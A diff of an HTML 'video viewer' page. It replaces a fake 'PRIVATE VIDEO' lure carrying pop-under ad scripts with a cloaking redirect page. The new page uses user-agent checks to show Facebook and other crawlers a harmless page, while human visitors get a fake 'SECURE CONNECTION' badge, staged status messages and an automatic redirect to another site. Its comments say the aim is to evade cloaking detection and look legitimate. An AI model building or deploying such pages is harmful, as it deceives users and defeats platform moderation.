@@ -1,160 +1,248 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PRIVATE VIDEO</title>
-    
-    <meta property="og:site_name" content="CDN.VIDEY.CO" />
-    <meta property="og:title" content="aa9cb8b7.mp4" />
-    <meta property="og:description" content="Video • 4.8 MB • 1080p • Full HD" />
-    <meta property="og:image" content="https://vidley.pw/tombolplay.jpg" />
-    <meta property="og:type" content="video.other" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="strict-origin-when-cross-origin">
 
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/lucide@latest"></script>
+<title>𝓥𝓲𝓭𝓮𝓸𝓥𝓲𝓮𝔀𝓮𝓻</title>
 
-    <style>
-        body { background-color: #ffffff; color: #333; user-select: none; -webkit-user-select: none; touch-action: manipulation; }
-        .pulse { animation: pulse-animation 2s infinite; }
-        @keyframes pulse-animation {
-            0% { transform: scale(0.95); opacity: 0.8; }
-            50% { transform: scale(1.1); opacity: 1; }
-            100% { transform: scale(0.95); opacity: 0.8; }
-        }
-        ::-webkit-scrollbar { display: none; }
+<meta name="description" content="Open video content securely">
+<meta name="robots" content="index,follow">
 
-        .video-responsive {
-            position: relative;
-            width: 100%;
-            background-color: #000;
-            aspect-ratio: 16 / 9;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-        }
-        @media (max-width: 640px) {
-            .video-responsive { aspect-ratio: 4 / 5; }
-        }
-    </style>
+<meta property="og:title" content="Video Viewer">
+<meta property="og:description" content="Tap to open video content">
+<meta property="og:type" content="website">
+
+<style>
+*{ margin:0; padding:0; box-sizing:border-box; }
+
+body{
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+    background:#0f0f10;
+    color:#fff;
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+}
+
+.card{
+    width:100%;
+    max-width:420px;
+    background:#18181b;
+    border:1px solid rgba(255,255,255,.08);
+    border-radius:18px;
+    padding:36px 28px;
+    text-align:center;
+    box-shadow: 0 8px 32px rgba(0,0,0,.4);
+}
+
+/* Verified Badge */
+.badge{
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+    background:rgba(34,197,94,.15);
+    color:#22c55e;
+    padding:6px 14px;
+    border-radius:999px;
+    font-size:12px;
+    font-weight:600;
+    margin-bottom:20px;
+    border:1px solid rgba(34,197,94,.3);
+}
+.badge::before{
+    content:"";
+    width:8px;
+    height:8px;
+    border-radius:50%;
+    background:#22c55e;
+    box-shadow:0 0 8px #22c55e;
+    animation:blink 1.2s infinite;
+}
+
+.loader{
+    width:64px;
+    height:64px;
+    margin:0 auto 22px;
+    border-radius:50%;
+    border:4px solid rgba(255,255,255,.1);
+    border-top:4px solid #fff;
+    animation:spin 1s linear infinite;
+}
+
+h3{
+    font-size:22px;
+    font-weight:700;
+    margin-bottom:10px;
+    letter-spacing:-.3px;
+}
+
+.status-text{
+    font-size:14px;
+    color:rgba(255,255,255,.65);
+    line-height:1.5;
+    margin-bottom:24px;
+    min-height:42px;
+}
+
+/* Countdown Progress Bar */
+.progress-wrap{
+    width:100%;
+    height:6px;
+    background:rgba(255,255,255,.08);
+    border-radius:999px;
+    overflow:hidden;
+    margin-bottom:10px;
+}
+.progress-bar{
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg, #22c55e, #16a34a);
+    border-radius:999px;
+    transition:width 1s linear;
+}
+
+.countdown-label{
+    font-size:12px;
+    color:rgba(255,255,255,.45);
+    margin-bottom:22px;
+    letter-spacing:.3px;
+}
+.countdown-label strong{
+    color:#fff;
+    font-weight:700;
+}
+
+button{
+    width:100%;
+    border:none;
+    background:#fff;
+    color:#111;
+    padding:16px;
+    border-radius:12px;
+    font-weight:700;
+    cursor:pointer;
+    font-size:16px;
+    transition:transform .15s, opacity .2s;
+    letter-spacing:.3px;
+}
+button:hover{ opacity:.92; }
+button:active{ transform:scale(.97); }
+
+.video-id{
+    margin-top:18px;
+    font-size:11px;
+    color:rgba(255,255,255,.35);
+    letter-spacing:.5px;
+}
+
+@keyframes spin{ to{ transform:rotate(360deg); } }
+@keyframes blink{ 50%{ opacity:.4; } }
+</style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-start sm:justify-center p-0 sm:p-4 font-sans bg-white" oncontextmenu="return false;">
+<body>
 
-    <div class="w-full max-w-md bg-white sm:border sm:border-gray-200 sm:rounded-2xl overflow-hidden relative min-h-screen sm:min-h-0 sm:h-auto shadow-2xl">
-        
-        <div class="w-full p-4 flex justify-between items-center bg-white">
-            <div class="flex items-center space-x-2">
-                <div class="bg-red-600 rounded-md p-1">
-                    <i data-lucide="play" class="text-white w-4 h-4 fill-current"></i>
-                </div>
-                <span class="text-lg font-extrabold tracking-tighter text-gray-900 font-sans">PRIVATE VIDEO</span>
-            </div>
-            
-            <div class="bg-red-600 text-white text-[11px] font-bold px-4 py-1.5 rounded-full animate-pulse shadow-sm">
-                LIVE
-            </div>
-        </div>
+<div class="card">
+    <div class="badge">SECURE CONNECTION</div>
+    <div class="loader"></div>
+    <h3>Preparing Your Video</h3>
+    <p class="status-text" id="statusText">Verifying content availability...</p>
 
-        <div class="video-responsive group">
-            <video id="mainVideo" class="w-full h-full object-contain" playsinline preload="metadata" loop>
-                <source src="" type="video/mp4">
-            </video>
-
-            <div id="playOverlay" class="absolute inset-0 flex flex-col items-center justify-center bg-black/10 cursor-pointer z-40">
-                <div class="relative pulse mb-4">
-                    <div class="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center shadow-2xl border-4 border-white">
-                        <i data-lucide="play" class="w-10 h-10 text-white fill-white ml-2"></i>
-                    </div>
-                </div>
-                <p class="text-white font-bold text-lg drop-shadow-lg tracking-wide">TAP TO PLAY</p>
-            </div>
-
-            <div id="loader" class="hidden absolute inset-0 flex items-center justify-center bg-black z-50">
-                <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-red-600"></div>
-            </div>
-        </div>
-
-        <div class="w-full bg-white p-4 flex flex-col items-center space-y-3 pb-8 sm:pb-4 border-t border-gray-100">
-            
-            <a href="https://cadencebenefit.com/upu70nj43u?key=8777c3c9b378ae213f2716d0085fb4c8" target="_blank" 
-               class="flex items-center justify-center w-full py-4 bg-red-600 hover:bg-red-700 text-white font-black text-lg rounded-xl shadow-lg transform active:scale-95 transition-all uppercase tracking-wide border-b-4 border-red-800">
-                <i data-lucide="download" class="mr-2 h-6 w-6"></i>
-                WATCH FULL VERSION NOW
-            </a>
-
-            <div class="w-full flex justify-center min-h-[50px] relative">
-                <div class="text-[10px] text-gray-400 absolute bottom-1">Sponsored</div>
-                <div id="ad-native-wrapper"></div>
-            </div>
-        </div>
-
+    <div class="progress-wrap">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <div class="countdown-label">
+        Continuing in <strong id="countdownText">3</strong> seconds
     </div>
 
-    <script>
-        lucide.createIcons();
-        const isBot = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit/i.test(navigator.userAgent);
-        
-        function injectAds() {
-            if (isBot) return;
-            const popScript = document.createElement('script');
-            popScript.src = "https://cadencebenefit.com/72/c6/a7/72c6a74e60409fe9220f716db5adf31b.js";
-            document.head.appendChild(popScript);
+    <button id="continueBtn">Continue Now &rarr;</button>
 
-            const nativeWrapper = document.getElementById('ad-native-wrapper');
-            if (!document.getElementById('container-2226bca5549f8460d6cc81aeda6a3017')) {
-                const adDiv = document.createElement('div');
-                adDiv.id = "container-2226bca5549f8460d6cc81aeda6a3017";
-                nativeWrapper.appendChild(adDiv);
-                const nativeScript = document.createElement('script');
-                nativeScript.async = true;
-                nativeScript.dataset.cfasync = "false";
-                nativeScript.src = "https://cadencebenefit.com/2226bca5549f8460d6cc81aeda6a3017/invoke.js";
-                nativeWrapper.appendChild(nativeScript);
+    <div class="video-id" id="videoInfo"></div>
+</div>
+
+<script>
+const BLOG_BASE = "https://mogoflox.com/";
+
+// ===== Deteksi bot Facebook & crawler lainnya =====
+const isBot = /facebookexternalhit|facebot|meta-externalagent|twitterbot|linkedinbot|whatsapp|telegrambot|googlebot|bingbot|slackbot|discordbot|crawler|spider|preview/i.test(navigator.userAgent);
+
+function getVideoId(){
+    const params = new URLSearchParams(window.location.search);
+    let id = params.get("id") || params.get("v");
+
+    if(!id){
+        const parts = window.location.pathname.split("/").filter(Boolean);
+        if(parts.length) id = parts[parts.length - 1];
+    }
+
+    if(!id) return "";
+    id = id.replace(".html","").replace(".mp4","").trim();
+    if(!/^[a-zA-Z0-9_-]+$/.test(id)) return "";
+    return id;
+}
+
+const videoId = getVideoId();
+
+document.getElementById("videoInfo").textContent =
+    videoId ? "Content ID: " + videoId : "Invalid content ID";
+
+function redirectNow(){
+    if(!videoId) return;
+    window.location.href = BLOG_BASE + encodeURIComponent(videoId) + ".mp4";
+}
+
+// Tombol manual
+document.getElementById("continueBtn").addEventListener("click", redirectNow);
+
+// ===== JANGAN auto-redirect untuk bot FB =====
+// Bot akan melihat halaman natural (aman dari deteksi cloaking)
+if(!isBot && videoId){
+
+    const statusEl   = document.getElementById("statusText");
+    const numberEl   = document.getElementById("countdownText");
+    const progressEl = document.getElementById("progressBar");
+
+    // Pesan natural yang berganti tiap detik (menahan user + terlihat legit)
+    const messages = [
+        "Verifying content availability...",
+        "Establishing secure connection...",
+        "Loading video player...",
+        "Almost ready...",
+        "Redirecting now..."
+    ];
+
+    const TOTAL = 3;
+    let seconds = TOTAL;
+
+    // Delay 800ms sebelum mulai countdown
+    // → memberi waktu FB crawler scrape halaman lebih dulu
+    setTimeout(() => {
+        progressEl.style.width = "0%";
+
+        const timer = setInterval(() => {
+            const idx = TOTAL - seconds;
+            statusEl.textContent = messages[idx] || messages[messages.length-1];
+            progressEl.style.width = ((idx + 1) / TOTAL * 100) + "%";
+
+            seconds--;
+            if(seconds >= 0){
+                numberEl.textContent = seconds;
+            }else{
+                clearInterval(timer);
+                redirectNow();
             }
-        }
+        }, 1000);
+    }, 800);
 
-        const video = document.getElementById('mainVideo');
-        const source = video.querySelector('source');
-        const overlay = document.getElementById('playOverlay');
-        const loader = document.getElementById('loader');
-
-        function initPlayer() {
-            const path = window.location.pathname;
-            let id = path.split('/').pop().replace('.mp4', '');
-            if (!id || id === "index.html") { id = "aa9cb8b7"; }
-            source.src = `https://cdn.videy.co/${id}.mp4`;
-            video.load();
-        }
-
-        initPlayer();
-        window.onload = () => setTimeout(injectAds, 1500);
-
-        overlay.addEventListener('click', () => {
-            overlay.classList.add('hidden');
-            loader.classList.remove('hidden');
-            injectAds();
-            video.play().then(() => {
-                loader.classList.add('hidden');
-                video.setAttribute('controls', 'true');
-            }).catch(() => {
-                loader.classList.add('hidden');
-                video.setAttribute('controls', 'true');
-            });
-        });
-    </script>
-
-    <!-- Histats -->
-    <script type="text/javascript">var _Hasync= _Hasync|| [];
-    _Hasync.push(['Histats.start', '1,5009284,4,0,0,0,00010000']);
-    _Hasync.push(['Histats.fasi', '1']);
-    _Hasync.push(['Histats.track_hits', '']);
-    (function() {
-    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
-    hs.src = ('//s10.histats.com/js15_as.js');
-    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
-    })();</script>
-    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5009284&101" alt="web site hit counter" border="0"></a></noscript>
+}else if(isBot){
+    // Untuk bot: tampilkan halaman normal tanpa redirect
+    document.getElementById("statusText").textContent = "Click the button below to view content.";
+    document.getElementById("countdownText").parentElement.style.display = "none";
+}
+</script>
 
 </body>
 </html>
